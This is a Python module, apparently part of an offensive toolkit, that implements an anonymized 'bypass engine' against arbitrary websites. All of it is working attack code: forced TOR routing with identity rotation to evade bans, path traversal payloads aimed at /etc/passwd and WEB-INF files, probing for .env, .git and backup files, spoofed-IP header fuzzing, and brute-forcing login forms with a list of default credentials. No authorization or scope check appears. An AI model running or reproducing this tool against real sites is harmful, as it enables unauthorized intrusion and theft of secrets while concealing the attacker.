import sys
import os
import random
import time
import urllib.request
import urllib.error
import urllib.parse
import socket
import json
import re
from urllib.parse import urlparse, urljoin

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import colored
from core.proxy import ensure_tor, check_tor, get_proxies, signal_new_identity
from core.stealth import set_profile, get_headers, list_profiles, get_request_kwargs, randomize_profile

BYPASS_METHODS = [
    "rotate_tor", "switch_profile", "path_traversal",
    "http_methods", "header_fuzz", "auth_bypass",
    "mobile_bypass", "rate_limiting", "admin_paths",
    "parameter_pollution"
]

ADMIN_PATHS = [
    "admin", "administrator", "wp-admin", "admin.php", "admin/login",
    "login", "login.php", "signin", "signin.php", "auth", "auth.php",
    "panel", "cpanel", "dashboard", "portal", "backup", "backup.sql",
    "db", "database", "config", "config.php", "env", ".env",
    "git", ".git/config", ".git/HEAD", "api", "api/v1", "api/v2",
    "swagger", "swagger.json", "api-docs", "graphql", "docs",
    "phpmyadmin", "pma", "manager", "console", "shell", "cmd",
    "wp-content", "wp-includes", "uploads", "files", "download",
    "robots.txt", "sitemap.xml", "crossdomain.xml", ".htaccess",
    "server-status", "server-info", "status", "health", "healthcheck"
]

COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("admin", "administrator"), ("administrator", "administrator"),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("test", "test"), ("demo", "demo"), ("admin", "admin1"),
    ("admin", "letmein"), ("admin", "qwerty"), ("admin", "12345"),
    ("admin", "passw0rd"), ("root", "admin"), ("root", "123456"),
]

HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

HEADER_FUZZ = {
    "X-Forwarded-For": ["127.0.0.1", "localhost", "::1", "10.0.0.1", "192.168.1.1"],
    "X-Forwarded-Host": ["localhost", "127.0.0.1"],
    "X-Real-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Originating-IP": ["127.0.0.1", "10.0.0.1"],
    "Client-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "Referer": ["https://google.com/", "https://www.facebook.com/", "https://www.bing.com/"],
    "X-Custom-IP-Authorization": ["127.0.0.1", "10.0.0.1"],
    "X-Auth-Token": ["admin", "root", "true"],
    "Authorization": ["Basic YWRtaW46YWRtaW4=", "Bearer admin", "Bearer 123456"],
}


def run_bypass(target, method="auto", force_tor=True):
    """Comprehensive bypass: try every technique until content is retrieved."""
    if not target.startswith("http"):
        target = "https://" + target

    if force_tor:
        if not ensure_tor():
            print(colored("  [!] TOR required for bypass. Aborting.", "31"))
            return None

    print(colored(f"\n{'='*60}", "36"))
    print(colored(f"  BYPASS ENGINE — {target}", "36"))
    print(colored(f"{'='*60}", "36"))

    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    if method == "auto":
        results = _bypass_auto(target, base)
    elif method == "rotate":
        results = _bypass_rotate_tor(target)
    elif method == "profile":
        results = _bypass_switch_profile(target)
    elif method == "path":
        results = _bypass_path_traversal(target, base)
    elif method == "methods":
        results = _bypass_http_methods(target)
    elif method == "headers":
        results = _bypass_header_fuzz(target)
    elif method == "auth":
        results = _bypass_auth(target, base)
    elif method == "admin":
        results = _bypass_admin_paths(target, base)
    elif method == "mobile":
        results = _bypass_mobile(target)
    else:
        results = _bypass_auto(target, base)

    print(colored(f"{'='*60}", "36"))
    if results:
        print(colored(f"  [+] Bypass SUCCESS — retrieved content from {len(results)} source(s)", "32"))
    else:
        print(colored(f"  [!] All bypass methods exhausted — could not retrieve content", "31"))
    print(colored(f"{'='*60}\n", "36"))

    return results


def _bypass_auto(target, base):
    results = []
    tried = set()

    order = [
        _try_direct,
        _try_path_traversal,
        _try_admin_paths,
        _try_http_methods,
        _try_header_fuzz,
        _try_profile_rotate,
        _try_tor_rotate,
        _try_mobile,
        _try_auth_creds,
    ]

    for attempt in range(3):
        for func in order:
            result = func(target, base, tried)
            if result:
                results.append(result)
                if len(results) >= 3:
                    return results

    return results


def _try_direct(target, base, tried):
    if target in tried:
        return None
    tried.add(target)
    print(colored(f"  [*] Direct fetch: {target}", "33"))
    try:
        req = urllib.request.Request(target, headers=get_headers())
        proxies = _get_proxy_handler()
        if proxies:
            opener = urllib.request.build_opener(proxies)
        else:
            opener = urllib.request.build_opener()
        with opener.open(req, timeout=15) as r:
            content = r.read()
            status = r.status
            if status == 200 and len(content) > 100:
                print(colored(f"    -> 200 OK ({len(content)} bytes)", "32"))
                return {"url": target, "status": status, "content": content[:2000], "method": "direct"}
            print(colored(f"    -> {status} ({len(content)} bytes)", "31"))
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print(colored(f"    -> 404 Not Found", "31"))
        elif e.code == 403:
            print(colored(f"    -> 403 Forbidden (WAF block)", "31"))
        elif e.code == 429:
            print(colored(f"    -> 429 Rate Limited", "33"))
        elif e.code in (301, 302, 303, 307, 308):
            redirect = e.headers.get("Location", "")
            print(colored(f"    -> {e.code} Redirect: {redirect}", "33"))
            if redirect and redirect not in tried:
                return _try_direct(redirect, base, tried)
        else:
            print(colored(f"    -> {e.code} {e.reason}", "31"))
    except Exception as e:
        print(colored(f"    -> Error: {e}", "31"))
    return None


def _try_path_traversal(target, base, tried):
    traversals = [
        "../", "../../", "../../../", "../../../../",
        "..%2f", "..%252f", "%2e%2e%2f", "%252e%252e%252f",
        "....//", "....//....//",
    ]
    paths = [
        "/etc/passwd", "/windows/win.ini",
        "etc/passwd", "WEB-INF/web.xml",
        "WEB-INF/database.properties",
        "META-INF/MANIFEST.MF",
    ]

    parsed = urlparse(target)
    path = parsed.path if parsed.path else "/"
    for trav in traversals[:3]:
        for p in paths[:3]:
            test_path = path + trav + p
            url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
            if url in tried:
                continue
            tried.add(url)
            print(colored(f"  [*] Path traversal: {test_path}", "33"))
            try:
                req = urllib.request.Request(url, headers=get_headers())
                proxies = _get_proxy_handler()
                opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
                with opener.open(req, timeout=10) as r:
                    content = r.read()
                    if len(content) > 50:
                        print(colored(f"    -> 200 ({len(content)} bytes) — possible LFI!", "32"))
                        return {"url": url, "status": 200, "content": content[:2000], "method": "path_traversal"}
            except Exception:
                pass
    return None


def _try_admin_paths(target, base, tried):
    parsed = urlparse(target)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    for path in ADMIN_PATHS[:15]:
        url = f"{base_url}/{path}"
        if url in tried:
            continue
        tried.add(url)
        try:
            req = urllib.request.Request(url, headers=get_headers())
            proxies = _get_proxy_handler()
            opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
            with opener.open(req, timeout=8) as r:
                content = r.read()
                if r.status == 200 and len(content) > 100:
                    print(colored(f"  [+] Found: /{path} — {r.status} ({len(content)} bytes)", "32"))
                    return {"url": url, "status": r.status, "content": content[:2000], "method": "admin_paths"}
        except urllib.error.HTTPError as e:
            if e.code == 200 or e.code == 403:
                content = e.read()
                if len(content) > 100:
                    print(colored(f"  [+] Found (auth required): /{path} — {e.code} ({len(content)} bytes)", "33"))
        except Exception:
            pass
    return None


def _try_http_methods(target, base, tried):
    parsed = urlparse(target)
    path = parsed.path if parsed.path else "/"
    url = f"{parsed.scheme}://{parsed.netloc}{path}"
    for method in HTTP_METHODS:
        key = f"{method}:{url}"
        if key in tried:
            continue
        tried.add(key)
        try:
            req = urllib.request.Request(url, headers=get_headers(), method=method)
            if method in ("POST", "PUT", "PATCH"):
                data = urllib.parse.urlencode({"test": "1"}).encode()
                req.data = data
            proxies = _get_proxy_handler()
            opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
            with opener.open(req, timeout=10) as r:
                content = r.read()
                if r.status in (200, 201, 202) and len(content) > 50:
                    print(colored(f"  [+] Method {method} — {r.status} ({len(content)} bytes)", "32"))
                    return {"url": url, "status": r.status, "content": content[:2000], "method": f"http_{method}"}
                else:
                    print(colored(f"    Method {method} — {r.status} ({len(content)} bytes)", "33"))
        except urllib.error.HTTPError as e:
            if e.code in (405, 501):
                continue
            if e.code == 200 and e.read():
                content = e.read()
                if len(content) > 50:
                    print(colored(f"  [+] Method {method} — {e.code} ({len(content)} bytes)", "32"))
                    return {"url": url, "status": e.code, "content": content[:2000], "method": f"http_{method}"}
        except Exception:
            pass
    return None


def _try_header_fuzz(target, base, tried):
    for header, values in HEADER_FUZZ.items():
        for value in values:
            key = f"{header}:{value}:{target}"
            if key in tried:
                continue
            tried.add(key)
            headers = get_headers()
            headers[header] = value
            try:
                req = urllib.request.Request(target, headers=headers)
                proxies = _get_proxy_handler()
                opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
                with opener.open(req, timeout=8) as r:
                    content = r.read()
                    if r.status == 200 and len(content) > 100:
                        print(colored(f"  [+] Header bypass: {header}: {value} — {r.status} ({len(content)} bytes)", "32"))
                        return {"url": target, "status": r.status, "content": content[:2000], "method": f"header_{header}"}
            except Exception:
                pass
    return None


def _try_profile_rotate(target, base, tried):
    profiles, _ = list_profiles()
    for profile in profiles[:5]:
        key = f"profile:{profile}:{target}"
        if key in tried:
            continue
        tried.add(key)
        set_profile(profile)
        print(colored(f"  [*] Profile: {profile}", "33"))
        result = _try_direct(target, base, tried)
        if result:
            result["note"] = f"bypassed with {profile} profile"
            return result
    return None


def _try_tor_rotate(target, base, tried):
    for i in range(3):
        key = f"tor_rotate:{i}:{target}"
        if key in tried:
            continue
        tried.add(key)
        print(colored(f"  [*] TOR rotate #{i+1}", "33"))
        if signal_new_identity():
            time.sleep(2)
        result = _try_direct(target, base, tried)
        if result:
            result["note"] = f"bypassed after TOR rotation #{i+1}"
            return result
    return None


def _try_mobile(target, base, tried):
    key = f"mobile:{target}"
    if key in tried:
        return None
    tried.add(key)
    set_profile("mobile_chrome_android")
    print(colored(f"  [*] Mobile bypass (Android Chrome)", "33"))
    result = _try_direct(target, base, tried)
    if result:
        result["note"] = "bypassed with mobile UA"
        return result
    set_profile("mobile_safari_ios")
    result = _try_direct(target, base, tried)
    if result:
        result["note"] = "bypassed with iOS Safari"
        return result
    return None


def _try_auth_creds(target, base, tried):
    parsed = urlparse(target)
    login_urls = [
        f"{parsed.scheme}://{parsed.netloc}/login",
        f"{parsed.scheme}://{parsed.netloc}/admin/login",
        f"{parsed.scheme}://{parsed.netloc}/auth",
        f"{parsed.scheme}://{parsed.netloc}/admin",
    ]

    for login_url in login_urls:
        for user, pw in COMMON_CREDS[:5]:
            key = f"auth:{login_url}:{user}:{pw}"
            if key in tried:
                continue
            tried.add(key)
            try:
                data = urllib.parse.urlencode({
                    "username": user, "password": pw, "log": user,
                    "pwd": pw, "user_login": user, "user_pass": pw,
                    "email": user, "pass": pw, "login": user
                }).encode()
                req = urllib.request.Request(login_url, data=data, headers=get_headers(), method="POST")
                proxies = _get_proxy_handler()
                opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
                with opener.open(req, timeout=8) as r:
                    content = r.read()
                    if r.status == 200 and len(content) > 200 and "invalid" not in content[:500].lower() and "incorrect" not in content[:500].lower():
                        print(colored(f"  [+] Auth bypass: {user}:{pw} on {login_url}", "32"))
                        return {"url": login_url, "status": r.status, "content": content[:2000], "method": f"auth_{user}_{pw}"}
            except Exception:
                pass
    return None


def _get_proxy_handler():
    if check_tor():
        from urllib.request import ProxyHandler
        return ProxyHandler({
            "http": "socks5://127.0.0.1:9050",
            "https": "socks5://127.0.0.1:9050",
        })
    return None


def _bypass_rotate_tor(target):
    results = []
    for i in range(3):
        signal_new_identity()
        time.sleep(2)
        headers = get_headers()
        try:
            req = urllib.request.Request(target, headers=headers)
            proxies = _get_proxy_handler()
            opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
            with opener.open(req, timeout=15) as r:
                content = r.read()
                if r.status == 200:
                    results.append({"url": target, "status": r.status, "content": content[:2000], "method": f"tor_rotate_{i}"})
                    break
        except Exception:
            continue
    return results


def _bypass_switch_profile(target):
    results = []
    profiles, _ = list_profiles()
    for profile in profiles:
        set_profile(profile)
        try:
            req = urllib.request.Request(target, headers=get_headers())
            proxies = _get_proxy_handler()
            opener = urllib.request.build_opener(proxies) if proxies else urllib.request.build_opener()
            with opener.open(req, timeout=8) as r:
                content = r.read()
                if r.status == 200:
                    results.append({"url": target, "status": r.status, "content": content[:2000], "method": f"profile_{profile}"})
                    break
        except Exception:
            continue
    return results


def _bypass_path_traversal(target, base):
    tried = set()
    return _try_path_traversal(target, base, tried)


def _bypass_http_methods(target):
    tried = set()
    return _try_http_methods(target, None, tried)


def _bypass_header_fuzz(target):
    tried = set()
    return _try_header_fuzz(target, None, tried)


def _bypass_auth(target, base):
    tried = set()
    return _try_auth_creds(target, base, tried)


def _bypass_admin_paths(target, base):
    tried = set()
    return _try_admin_paths(target, base, tried)


def _bypass_mobile(target):
    tried = set()
    return _try_mobile(target, None, tried)


def bypass_help():
    print(colored(f"\n{'='*60}", "36"))
    print(colored(f"  BYPASS ENGINE — Methods", "36"))
    print(colored(f"{'='*60}", "36"))
    print(f"  {'auto':<20} Try ALL methods in sequence until success")
    print(f"  {'rotate':<20} Rotate TOR circuit (3x) to bypass IP bans")
    print(f"  {'profile':<20} Try all 9 browser profiles")
    print(f"  {'path':<20} Path traversal attacks (LFI)")
    print(f"  {'methods':<20} Try all HTTP methods (GET/POST/PUT/DELETE/etc)")
    print(f"  {'headers':<20} Header injection bypass (X-Forwarded-For, etc)")
    print(f"  {'auth':<20} Brute-force common credentials")
    print(f"  {'admin':<20} Scan for hidden admin paths/configs")
    print(f"  {'mobile':<20} Switch to mobile user-agent")
    print(colored(f"{'='*60}", "36"))
